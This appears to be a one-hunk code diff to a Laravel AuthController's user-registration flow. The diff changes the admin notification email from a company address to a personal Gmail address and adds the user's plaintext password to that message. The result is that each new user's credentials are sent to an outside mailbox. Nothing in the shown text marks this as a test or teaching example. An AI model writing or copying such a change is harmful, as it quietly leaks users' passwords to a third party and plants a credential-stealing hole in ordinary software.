@@ -483,7 +483,7 @@ class AuthController extends Controller
 
         Mail::to($user->email)->send(new SendUserLoginInfoMail($user->name, $user->email, $plainPassword));
 
-        Mail::to('info@futuretaikun.com')->send(new NewUserRegisteredMail($user->name, $user->email, $redirectRole));
+        Mail::to('tilvaprinsi123@gmail.com')->send(new NewUserRegisteredMail($user->name, $user->email, $redirectRole, $plainPassword));
 
         Log::info('Email sent successfully to:', ['email' => $user->email]);
         // Redirect based on role
